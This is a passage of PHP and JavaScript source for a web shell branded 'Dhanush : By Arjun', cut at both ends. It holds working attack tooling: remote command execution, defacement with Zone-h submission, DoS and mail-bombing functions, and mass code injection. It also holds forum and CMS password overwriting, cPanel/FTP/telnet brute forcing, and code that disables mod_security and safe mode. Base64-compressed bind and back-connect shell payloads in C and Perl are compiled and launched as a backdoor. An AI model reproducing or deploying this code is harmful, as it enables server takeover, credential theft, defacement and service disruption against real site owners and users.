		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function my404page(message)
{
	var message = encodeURIComponent(message);
	var params = "404page=404page&message="+message;
	document.getElementById("showdata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdata").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function executemyfn(executepath,executemycmd)
{
	document.getElementById("showexecute").innerHTML="Wait....";
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showexecute").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?executepath="+executepath+"&executemycmd="+executemycmd, true);
	ajaxRequest.send(null); 
}
function zoneh(defacer,hackmode,reason,domain)
{
	var domain = encodeURIComponent(domain);
	var params = "SendNowToZoneH=SendNowToZoneH&defacer="+defacer+"&hackmode="+hackmode+"&reason="+reason+"&domain="+domain;
	document.getElementById("showzone").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showzone").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function savemyfile(file,content)
{
	var content = encodeURIComponent(content);
	var params = "content="+content+"&file="+file;
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function renamefun(file,to)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?renamemyfile&file="+file+"&to="+to, true);
	ajaxRequest.send(null); 
}
function changeperms(chmode,myfilename)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?chmode="+chmode+"&myfilename="+myfilename, true);
	ajaxRequest.send(null); 
}
function defacefun(deface)
{
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			alert(ajaxRequest.responseText);
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?deface="+deface, true);
	ajaxRequest.send(null); 
}
function fileaction(myaction,myfilepath)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"&myfilepath="+myfilepath, true);
	ajaxRequest.send(null); 
}
function bypassfun(funct,functvalue,optiontype)
{
	document.getElementById("showbyp").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showbyp").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?bypassit&"+funct+"="+functvalue+"&optiontype="+optiontype, true);
	ajaxRequest.send(null); 
}
function dos(target,ip,port,timeout,exTime,no0fBytes,multiplier)
{
	document.getElementById("showdos").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdos").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+target+"&ip="+ip+"&port="+port+"&timeout="+timeout+"&exTime="+exTime+"&multiplier="+multiplier+"&no0fBytes="+no0fBytes, true);
	ajaxRequest.send(null); 
}
function createfile(filecreator,filecontent)
{
	var mm = filecreator.slice(0, filecreator.lastIndexOf("<?php echo addslashes($directorysperator); ?>"));
	var filecontent = encodeURIComponent(filecontent);
	var params = "filecontent="+filecontent+"&filecreator="+filecreator;
	document.getElementById("showdir").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			gethome('home',mm);
			document.getElementById("showdir").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function createdir(create,createfolder)
{
	document.getElementById("showdir").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdir").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+create+"="+createfolder, true);
	ajaxRequest.send(null); 
}
function codeinsert(code)
{
	var code = encodeURIComponent(code);
	var params = "getcode="+code;
	document.getElementById("showcode").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showcode").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function getmydata(mydata)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+mydata, true);
	ajaxRequest.send(null); 
}
function getdata(mydata,myfile)
{
	document.getElementById("showdata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdata").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+mydata+"&myfile="+myfile, true);
	ajaxRequest.send(null); 
}
function getport(host,protocol,start,end)
{
	document.getElementById("showports").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showports").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?host=" + host + "&protocol=" + protocol, true);
	ajaxRequest.send(null); 
}
function changeforumpassword(forumpass,f1,f2,f3,f4,forums,tableprefix,ipbuid,newipbpass,username,newjoomlapass,uid,uname,newpass)
{
	document.getElementById("showchangepass").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showchangepass").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER['PHP_SELF']; ?>?forumpass&f1=" + f1 + "&f2=" + f2 + "&f3=" + f3 + "&f4=" + f4 + "&forums=" + forums + "&prefix=" + tableprefix + "&ipbuid=" + ipbuid + "&newipbpass=" + newipbpass + "&username=" + username + "&newjoomlapass=" + newjoomlapass + "&uid=" + uid + "&uname=" + uname + "&newpass=" + newpass, true);
	ajaxRequest.send(null); 
}
function forumdefacefn(index,f1,f2,f3,f4,defaceforum,tableprefix,siteurl,head,alll,f5)
{
	var index = encodeURIComponent(index);
	var params = "forumdeface="+defaceforum+"&index=" + index + "&f1=" + f1 + "&f2=" + f2 + "&f3=" + f3 + "&f4=" + f4 + "&tableprefix="+tableprefix+"&siteurl="+siteurl+"&head="+head+"&alll="+alll+"&f5="+f5;
	document.getElementById("showdeface").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdeface").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function codeinjector(pathtomass,mode,filetype,injectthis)
{
	var injectthis = encodeURIComponent(injectthis);
	var params = "pathtomass="+pathtomass+"&mode=" + mode + "&filetype=" + filetype + "&injectthis=" + injectthis;
	document.getElementById("showinject").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showinject").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function sendmail(mailfunction,to,subject,message,from,times,padding)
{
	var message = encodeURIComponent(message);
	if(mailfunction == "massmailing")
		var params = "mailfunction="+mailfunction+"&to="+to+"&subject="+subject+"&from=" + from + "&message=" + message;
	else if(mailfunction == "dobombing")
		var params = "mailfunction="+mailfunction+"&to="+to+"&subject="+subject+"&times=" + times + "&padding=" + padding + "&message=" + message;
	document.getElementById("showmail").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmail").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function execode(code)
{
	var intext = document.getElementById('intext').checked;
	var message = encodeURIComponent(message);
	var params = "code="+code+"&intext="+intext;
	document.getElementById("showresult").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showresult").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function malwarefun(malwork)
{
	var malpath = document.getElementById('createfile').value;
	document.getElementById("showmal").innerHTML="<center><marquee scrollamount=4 width=150>Wait....</marquee></center>";
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmal").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+malwork+"&path="+malpath, true);
	ajaxRequest.send(null); 
}
function getexploit(wurl,path,functiontype)
{
	document.getElementById("showexp").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showexp").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?uploadurl&wurl="+wurl+"&functiontype="+functiontype+"&path="+path, true);
	ajaxRequest.send(null); 
}
function showMsg(msg)
{
	if(msg == 'smf')
	{
		document.getElementById('tableprefix').value="smf_";
		document.getElementById('fid').style.display='block';
		document.getElementById('wpress').style.display='none';
		document.getElementById('joomla').style.display='none';
	}
	if(msg == 'mybb')
	{
		document.getElementById('tableprefix').value="mybb_";
		document.getElementById('wpress').style.display='none';
		document.getElementById('joomla').style.display='none';
		document.getElementById('fid').style.display='block';
	}
	if(msg == 'ipb' || msg == 'vb')
	{
		document.getElementById('tableprefix').value="";
		document.getElementById('wpress').style.display='none';
		document.getElementById('joomla').style.display='none';
		document.getElementById('fid').style.display='block';
	}
	if(msg == 'wp')
	{
		document.getElementById('tableprefix').value="wp_";
		document.getElementById('wpress').style.display='block';
		document.getElementById('fid').style.display='none';
		document.getElementById('joomla').style.display='none';
	}
	if(msg == 'joomla')
	{
		document.getElementById('joomla').style.display='block';
		document.getElementById('tableprefix').value="jos_";
		document.getElementById('wpress').style.display='none';
		document.getElementById('fid').style.display='none';


	}
}
function checkforum(msg)
{
	if(msg == 'smf')
	{
		document.getElementById('tableprefix').value="smf_";
		document.getElementById('smfipb').style.display='block';
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('wordpres').style.display='none';
	}
	if(msg == 'phpbb')
	{	
		document.getElementById('tableprefix').value="phpb_";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='block';
		document.getElementById('wordpres').style.display='none';	
	}
	if(msg == 'mybb')
	{
		document.getElementById('tableprefix').value="mybb_";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='none';
	}
	if(msg == 'vb')
	{
		document.getElementById('tableprefix').value="";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='none';
	}
	if(msg == 'ipb')
	{
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='block';
		document.getElementById('tableprefix').value="";
		document.getElementById('wordpres').style.display='none';
		
	}
	if(msg == 'wp')
	{
		document.getElementById('tableprefix').value="wp_";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='block';
		document.getElementById('wordpres').style.display='block';
	}
	if(msg == 'joomla')
	{
		document.getElementById('myjoomla').style.display='block';
		document.getElementById('tableprefix').value="jos_";
		document.getElementById('smfipb').style.display='none';
		
	}
}
</script>
<body>
<?php
	
$back_connect_p="eNqlU01PwzAMvVfqfwjlkkpd94HEAZTDGENCCJC2cRrT1DUZCWvjqk5A/fcs3Rgg1gk0XxLnPT/bsnN60rZYthdKt4vKSNC+53sqL6A0BCuMCEK6EiYi4O52UZSQCkTHkoCGMMeKk/Llbdqd+V4dx4jShu7ee7PQ0TdCMQrDxTKxmTEqF2ANPe/U+LtUmSDdC98ja0NYOe1tTH3Qrde/md8+DCfR1h0/Du7m48lo2L8Pd7FxClqL1FDqqoxcWeE3FIXmNGBH2LMOfum1mu1aJtqibCY4vcs/Cg6AC06uKtIvX63+j+CxHe+pkLFxhUbkSi+BsU3eDQsw5rboUcdermergYZR5xDYPQT2DoFnn8OQIsvc4uw2NU6TLKPTwOokF0EUtJJgFu5r4wlFSRT/2UOznuJfOo2k+l+hdGnVmv4Bmanx6Q==";

$backconnect_perl="eNqlUl9rwjAQfxf8Drcqa4UWt1dLZU7rJmN2tNWXTUps45qtJiVNGf32S9pOcSAI3kNI7vcnd9z1boZlwYdbQoc55llZYFh4o1HA4m8s7G6n2+kXVSHwHmQ4oNfMLSpSXYL9if80dR7kuZYvpW110LzmJMPPiCYZVplup6hRI/CmL25owts8WizVRSWiIPTdyasJn1jknAm2rSjaY0MXca4PBtI/ZpTi+ChXbihJeESooSpZv99vTCAUiwgJ9pe72wykuv6+EVpjVAq2k62mRg2wHFMjCGeLpQna+LZhaSeQtwrNM5Dr+/+hnBMqQHOuiA+q2Qcj63zMUkRlI+cJlxhNWYITeKxgwr9KeonRda01Vs1aGRqOUwaW5ThBnSB0xxzHsmwo1fzBQjYoin3grQrMjyyS2KfwjHC5JYxXDZ7/tAQ4fpTiLFMoqHm1dbRrrhat53rzX0SL2FA=";

$bind_port_c="bZJRT9swEIDfK/U/eEVa7WJK0mkPrMukaoCEpnUT8DKVKjK2Q05LbMt2KGzw3+ekKQ0Zfkn83efL3TkHoHhRCYk+Oy9AT/Mvw8FBh1lQdz1YKQhuDyrpxe1/p0UBWwjKo5KBwvULs3ecIp4ziyaTsLkn6O9wgMKqo45yCvPtvnHM6kO0bkEoqOLB0fw3E8KmoJBtQ4LJUisc04jsZJQ0pvR4cZ5eLM+u6dWPr9/Sq+vLs8X3vQcZfucIstJXVqGjuMV26kClGSuheAyZ2hSvgkZbH0K518ph5jXgup1VvCbklVfXOnXNo9ULfLFcnJ5epovlr517C0pgRxHudYkm5L2lKHqIX0ouwhVIVcsfd2iTQyFx/DLLZn4J41waH8Ro328zrcrMMH+TxW+wWZdtLHgZ4Ognc26jrfg0oiddwUomQtxQB3+kzrAh3WimLYYkmkP9exWhC0PmcHhI9kZ7KQibFaxRkqDxjRoT9PTUJTaQ3pl6bYUQj8adb0LWTJWXZntDszU1pM4T9VK4xzDYEo+Ow2UcuxwdwahbOy+0C63v0PNw8PwP";

$bind_port_p="bZFvS8NADMZft9DvkNUxW6hsw5f+wbJVHc5WelUQldK1mTucd6W94cTtu3tpN1DxXS753ZMnyUGnv6qr/oyLfonV0jK77DqYTs/sJlUv4IjbJ5bJ5+Bc+PHVA5zC0IUvwDVXztA9ga1lrmoEJvM3VJqsm8BhXu/uMp2EQeL1WDS6SVkSB/6t94qqrKSSs0+RvaNzqPLy0HVhs4GCI9ijTCjIK8wUQqv0LKh/jYqesiRlFk1T0tTaLErj4J4F/ngce9qOZWrbhWaIzoqiSrlwumT8afDiTULiUj98/NtSliiglNWu3ZLXCoWWOf7DtYUf5MeCL9GhlVimkeU5aoejKAw9RmYMPnc6TrfkxdlcVm9uixl7PSEVUN4G2m+nwDkXWADxzW+jscWS8ST07NMe6dq/8tF94tnn/xSCOP5dwDXm0N52P1FZcT0RIbvhiFnpxbdYO59h5Eup70vYTogrGFCoL7/9Bg==";
shellstyle();
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><font size="6" color="#FF0000" style="text-decoration:none;" face="Times New Roman, Times, serif">Dhanush : By Arjun </font></a>

</div>
<hr color="#1B1B1B">
	
<table cellpadding="0" style="width:100%;">
	<tr>
		<td colspan="2" style="width:75%;">System Info : <font class="txt"><?php systeminfo(); ?></font></td>
		<td style="width:10%;">Server Port : <font class="txt"><?php serverport(); ?></font></td>	
		<td style="width:15%;"><a href=# onClick="maindata('com')"><font class="txt"><i>Software Info</i></font></a></td>
	</tr>
	<?php if($os != 'Windows' || shell_exec("id") != null) { ?><tr>
		<td style="width:75%;" colspan="2">Uid : <font class="txt"><?php echo shell_exec("id"); ?></font></td>
		<?php $d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		?><td colspan=2 style="width:75%;">Websites : <font class="txt"><?php echo "$count  Domains"; ?></font></td><?php
		}
		else if($users) 
		{
			$file = fopen("/etc/passwd", "r");
			while(!feof($file))
			{
				$s = fgets($file);
				$matches = array();
				$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
				$matches = str_replace("home/","",$matches[1]);
				if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
				continue;
				$count++;
			}
		 ?><td colspan=2 style="width:75%;">Websites : <font class="txt"><?php echo "$count  Domains"; ?></font></td><?php } ?>
	</tr><?php } ?>
	<tr>
		<td style="width:20%;">Disk Space : <font class="txt"><?php echo HumanReadableFilesize(diskSpace()); ?></font></td>
		<td style="width:20%;">Free Space : <font class="txt"><?php echo HumanReadableFilesize(freeSpace()); $dksp = diskSpace(); $frsp = freeSpace(); echo " (".(int)($frsp/$dksp*100)."%)"; ?></font></td>
		
		<td style="width:20%;">Server IP : <font class="txt"><a href="http://whois.domaintools.com/<?php serverip(); ?>"><?php serverip(); ?></a></font></td>
		<td style="width:15%;">Your IP : <font class="txt"><a href="http://whois.domaintools.com/<?php yourip(); ?>"><?php yourip(); ?></a></font></td>
	</tr>
	
	<tr>
		<?php if($os == 'Windows'){ ?><td style="width:15%;">View Directories : <font class="txt"><?php echo showDrives();?></font></td><?php } ?>
		<td style="width:30%;">Current Directory : <span id="crdir"><font color="#009900">
		<?php 
	$d = str_replace("\\",$directorysperator,$dir);
	if (substr($d,-1) != $directorysperator) {$d .= $directorysperator;}
	$d = str_replace("\\\\","\\",$d);
	$dispd = htmlspecialchars($d);
	$pd = $e = explode($directorysperator,substr($d,0,-1));
	$i = 0;
	foreach($pd as $b)
	{
	 $t = '';
	 $j = 0;
	 foreach ($e as $r)
	 {
	  $t.= $r.$directorysperator;
	  if ($j == $i) {break;}
	  $j++;
	 }
$href=addslashes($t);
	
	 echo "<a href=javascript:void(0) onClick=\"changedir('dir','$href')\"><b><font class=\"txt\">".htmlspecialchars($b).$directorysperator.'</font></b></a>';
	 $i++;
	}

		?>
		</font></span> <a href=# onClick="gethome('home','<?php echo addslashes(getcwd()); ?>')">[Home]</a></td>
		<td style="width:20%;">Disable functions : <font class="txt"><?php echo getDisabledFunctions(); ?> </font></td>
		<td>Safe Mode : <font class=txt><?php echo safe(); ?></font></td>
		<?php if($os == "Linux") { ?><td><a href="<?php echo $self.'?downloadit'?>"><font color="#FF0000">Download It</font></a><?php } ?></td>
	</tr>
	</table>
	
<?php $m1 = array('Symlink'=>'symlinkserver','Forum'=>'forum','Sec. Info'=>'secinfo','Code Inject'=>'injector','Bypassers'=>'bypass','Server Fuzzer'=>'fuzz','Zone-h'=>'zone','DoS'=>'dos','Mail'=>'mailbomb','Tools'=>'tools','PHP'=>'phpc','Exploit'=>'exploit','Connect'=>'connect');
	$m2 = array('SQL'=>'database','404 Page'=>'404','Malware Attack'=>'malattack','Cpanel Cracker'=>'cpanel','About'=>'about');
	echo "<table border=3 style=border-color:#333333; width=100%; cellpadding=2>
	<tr>";
	$menu = '';

	foreach($m1 as $k => $v)
		$menu .= "<td style=\"border:none;\"><a href=# onClick=\"maindata('".$v."')\"><font class=\"mainmenu\">[".$k."]</font></a></td>";
		echo $menu;
		echo "</tr>
</table>
<div style=\"float:left;\">
	<a href=\"javascript:history.back(1)\"><font class=txt size=3> [Back] </font></a>&nbsp;
	<a href=\"javascript:history.go(1)\"><font class=txt size=3> [Forward] </font></a>&nbsp;
	<a href=\"\"><font class=txt size=3> [Refresh] </font></a></div>
<table style=\"margin-left:270px; border-color:#333333;\" border=2 width=60%; cellpadding=2>
	<tr align=center>";
	foreach($m2 as $k => $v)
		$menu1 .= "<td style=\"border:none;\"><a href=# onClick=\"maindata('".$v."','".addslashes($_GET['dir'])."')\"><font class=\"mainmenu\">[".$k."]</font></a></td>";
		echo $menu1;
		echo "<td style=\"border:none;\"><a href=javascript:void(0) onClick=\"if(confirm('Are You Sure You Want To Kill This Shell ?')){getmydata('selfkill');}else{return false;}\"><font class=mainmenu>[SelfKill]</font></a></td>
		<td style=\"border:none;\"><a href=\"$self?logout\"><font class=mainmenu>[LogOut]</font></a></td>
	</tr>
</table>";?>

<div id="showmaindata"></div>
<?php

if(isset($_GET["downloadit"]))
{
	$FolderToCompress = getcwd(); 
	execmd("tar --create --recursion --file=backup.tar $FolderToCompress"); 
	
	$prd=explode("/","backup.tar");
	for($i=0;$i<sizeof($prd);$i++)
	{
		$nfd=$prd[$i];
	}
	@ob_clean(); 
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".filesize($nfd)); 
   header("Content-disposition: attachment; filename=\"".$nfd."\";"); 
   readfile($nfd);
   exit;	
}
//Turn Safe Mode Off

	if(getDisabledFunctions() != "None" || safe() != "OFF")
	{
	   	$file_pointer = fopen(".htaccess", "w+");
		fwrite($file_pointer, "<IfModule mod_security.c>
    				SecFilterEngine Off
   					 SecFilterScanPOST Off
					</IfModule> \n\r"); 
			
		$file_pointer = fopen("ini.php", "w+");
		fwrite($file_pointer, "<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>"); 

		$file_pointer = fopen("php.ini", "w+");
		fwrite($file_pointer, "safe_mode               =       Off"); 
					
		fclose($file_pointer); 
		
    }
	
	else if(isset($_POST['cpanelattack']))
	{
		if(!empty($_POST['username']) && !empty($_POST['password']))
		{
				$userlist=explode("\n",$_POST['username']);
				$passlist=explode("\n",$_POST['password']);
	
				if($_POST['cracktype'] == "ftp")
				{
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							ftp_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
				if ($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet")
				{
					if($cracktype == "telnet")
						$cpanel_port="23";
					else
						$cpanel_port="2082";
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);

						echo "<b><font face=Tahoma style=\"font-size: 9pt\" color=#008000> [ - ] </font><font face=Tahoma style=\"font-size: 9pt\" color=#FF0800>
						Processing user $pureuser ...</font></b><br><br>";

						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							cpanel_check($_POST['target'],$pureuser,$purepass,$connect_timeout);

						}
					}
				}
			}
			else
				$bdmessage =  "<center>Enter Username & Password List<center>";
		}
	
else if(isset($_GET['info']))
{
	$bdmessage = "<br><div align=left><font class=txt>".nl2br(shell_exec("whois ".$_GET['info']))."</font></div>";
}
else if(isset($_POST['u']))
{
	$path = $_REQUEST['path'];
	if(is_dir($path))
        {
		$setuploadvalue = 0;
            $uploadedFilePath = $_FILES['uploadfile']['name'];
            $tempName = $_FILES['uploadfile']['tmp_name'];
			if($os == "Windows")
	            $uploadPath = $path . $directorysperator .  $uploadedFilePath;
			else if($os == "Linux")
				 $uploadPath = $path . $directorysperator . $uploadedFilePath;
			if($stat = move_uploaded_file($_FILES['uploadfile']['tmp_name'] , $uploadPath))
           		$bdmessage = "<font class=txt size=3><blink>File uploaded to $uploadPath</blink></font>";
            else
            	$bdmessage = "<font  size=3><blink>Failed to upload file to $uploadPath</blink></font>";
         }
	?><script type="text/javascript">changedir('dir','<?php echo addslashes($path); ?>'); </script><?php
}
else if(isset($_POST['backdoor']))
{
	if(isset($_POST['passwd']) && isset($_POST['port']) && isset($_POST['lang']))
	{	  ?><script type="text/javascript">gethome('connect');</script><?php
		 $passwd = $_POST['passwd'];
		 
		 if($_POST['lang'] == 'c') 
		 {
			if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/backp.c",'w');
				@fwrite($fh,gzinflate(base64_decode($bind_port_c)));
				@fclose($fh);
				execmd("chmod  0755 ".getcwd()."/backp.c");
				execmd("gcc -o ".getcwd()."/backp ".getcwd()."/backp.c");
				execmd("chmod  0755 ".getcwd()."/backp");
				execmd(getcwd()."/backp"." ".$_POST['port']." ". $passwd ." &");
				$scan = exec_all("ps aux | grep backp".$_POST['port']); 
				if(eregi("backp".$_POST['port'],$scan))
					$bdmessage = "Process found running, backdoor setup successfully.";
				else
					$bdmessage = "Process not found running, backdoor not setup successfully.";
			} 
			else 
			{
				@$fh=fopen("/tmp/backp.c","w");
